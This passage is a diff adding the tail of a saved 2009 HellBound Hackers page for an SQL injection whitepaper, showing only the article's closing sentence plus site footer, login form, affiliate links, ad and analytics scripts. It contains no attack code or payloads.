+Just keep your eyes open and i am sure you will find a lot of sql vulnerabilities </div>  </div>
+
+<div style='text-align:center;' class='news-footer'><img src='900-sql-injection-whitepaper_files/bullet.gif' alt='security article' />
+Posted by <a href='../profile/jelmer.html'>jelmer</a>
+on July 05 2009 - 20:06:21&nbsp;&nbsp; | &nbsp;&nbsp;
+<a href='comments-900-sql-injection-whitepaper.html'>15 Comments</a> | 
+5874 Reads | 
+Print <a href='print.php?type=A&amp;item_id=900'> <img src='900-sql-injection-whitepaper_files/printer.gif' alt='print this tutorial' style='border:0px;' /></a>
+
+</div>
+</div>
+</td><td style="width:170px;vertical-align:top;" class='side-border-right'>
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Guest</div>
+
+<div class='side-body'>
+<div></div>
+<form id='loginform' method='post' action='readarticle.php'>
+<div style="text-align: center;">
+Username<br />
+<input type='text' name='user_name' class='textbox' style='width:100px' /><br />
+Password<br />
+<input type='password' name='user_pass' class='textbox' style='width:100px' /><br />
+<input type='checkbox' name='remember_me' value='y' />Remember Me<br /><br />
+<input type='submit' name='login' value='Login' class='button' /><br />
+</div>
+</form>
+<div style="text-align: center;">
+<br />
+<img src='900-sql-injection-whitepaper_files/bullet.gif' alt='Bullet' /> <a href='../register.php' class='side'>Register</a><br />
+<img src='900-sql-injection-whitepaper_files/bullet.gif' alt='Bullet' /> <a href='../lostpassword.php' class='side'>Lost Password?</a>
+</div>
+</div>
+
+</div>
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Bookmark This Page</div>
+
+<div class='side-body'>
+
+<div style="text-align: center;">
+<!-- AddThis Bookmark Button BEGIN -->
+<script type="text/javascript">
+  addthis_url    = location.href;   
+  addthis_title  = document.title;  
+  addthis_pub    = 'hellboundhackers';     
+</script><script type="text/javascript" src="900-sql-injection-whitepaper_files/addthis_widget.php" ></script>
+<!-- AddThis Bookmark Button END -->
+</div>
+
+</div>
+
+</div>
+
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Affiliates</div>
+
+<div class='side-body'>
+<div style="text-align: center;font-size: 12px;">
+<a href='http://www.php-fusion.co.uk'>PHP-Fusion</a><br />
+<a href='http://www.hackthissite.org/'>HackThisSite</a><br />
+<a href='http://elites0ft.com/'>Elites0ft</a><br />
+<a href='http://blog.psych0tik.net/'>psych0tik.blog</a><br />
+<a href='http://www.acc3ssdenied.com/'><img src='900-sql-injection-whitepaper_files/aff_btn.png' style='height:30px;width:80px;border:none' alt='acc3ssdenied.com' /></a><br/>
+
+</div></div>
+
+</div>
+<div style='width:100%;padding:0px;'>
+
+<div class='scapmain' style='text-align:center;height:14px;'>Adverts</div>
+
+<div class='side-body'>
+<p> &nbsp; </p><script src="http://bdv.bidvertiser.com/BidVertiser.dbm?pid=241195&amp;bid=588581" type="text/javascript"></script>
+</div>
+
+</div>
+</td>
+
+
+
+
+</tr>
+</table>
+<div class='white-header' style='text-align:center;font-weight:bold;'>
+By using, viewing or obtaining any information contained on this site, you agree to the <a href='../disclaimer.php'>disclaimer</a>.<br />
+<br />
+&copy; HellBound Hackers 2008- 2009. Since 3rd December 2004.
+</div>
+
+<div class='full-header' style='text-align:center;'><br />
+13760734 Unique Visits<br /><br />
+Powered by HBH-Fusion<br /><br />
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-2892168-1");
+pageTracker._trackPageview();
+</script>
+
+
+</body>
+</html>
